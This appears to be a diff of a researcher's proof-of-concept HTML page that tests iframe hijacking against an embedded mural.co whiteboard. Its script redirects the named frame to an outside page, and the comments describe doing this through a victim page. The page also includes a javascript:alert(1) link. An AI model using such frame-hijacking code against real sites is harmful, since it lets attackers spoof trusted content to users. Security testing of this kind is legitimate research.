@@ -11,13 +11,13 @@
     <button onclick="openNewTab()">Open New Tab</button>
     <!-- <iframe name="embeddedMessagingSiteContextFrame"></iframe> -->
     <a href="javascript:alert(1)">testtt</a>
-    <iframe src="https://start.mural.co/digital-whiteboard" name="start" width="100" height="100"></iframe>
+    <iframe src="https://start.mural.co/digital-whiteboard" name="start" class="badr" width="100" height="100"></iframe>
 
     <script>
         // Method 1: Open a new tab, then hijack the iframe by targeting its name
         function openNewTab() {
-            let x = document.getElementsByName("start");
-            x.frames[0].href = "https://daemoon.me/alert.html"
+            let x = document.getElementsByClassName("badr")
+            x.frames[0].location.href = "https://daemoon.me/alert.html"
             // 1. Open victim.html (which contains <iframe name="myframe">)
             // window.open("https://app.mural.co/", "_blank");
 
